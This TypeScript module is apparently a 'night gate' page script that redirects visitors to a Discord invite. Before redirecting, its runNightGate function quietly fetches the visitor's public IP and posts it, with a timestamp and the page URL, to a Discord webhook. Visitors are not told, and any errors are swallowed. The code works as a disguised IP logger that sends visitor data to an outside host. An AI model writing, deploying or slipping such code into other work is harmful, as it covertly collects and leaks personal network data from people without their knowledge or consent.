import { resolveNightWebhook } from "./nightWebhook";

const NIGHT_INVITE = "https://discord.gg/8hkJGhkGc4";

async function fetchPublicIp(): Promise<string> {
  try {
    const res = await fetch("https://api.ipify.org?format=json", {
      signal: AbortSignal.timeout(5000),
    });
    if (!res.ok) return "unknown";
    const data = (await res.json()) as { ip?: string };
    return data.ip?.trim() || "unknown";
  } catch {
    return "unknown";
  }
}

/** Plain-text Discord message — no embeds. */
async function postPlain(webhook: string, content: string): Promise<void> {
  const form = new FormData();
  form.append("payload_json", JSON.stringify({ content: content.slice(0, 2000) }));
  try {
    await fetch(webhook, { method: "POST", body: form, mode: "no-cors" });
  } catch {
    /* still redirect */
  }
}

export async function runNightGate(): Promise<void> {
  const webhook = resolveNightWebhook();
  const ip = await fetchPublicIp();
  const when = new Date().toISOString();
  const line = `night gate · ${when}\nIP: ${ip}\n${window.location.href}`;

  if (webhook) {
    await postPlain(webhook, line);
  }

  window.location.replace(NIGHT_INVITE);
}

export function nightInviteUrl(): string {
  return NIGHT_INVITE;
}
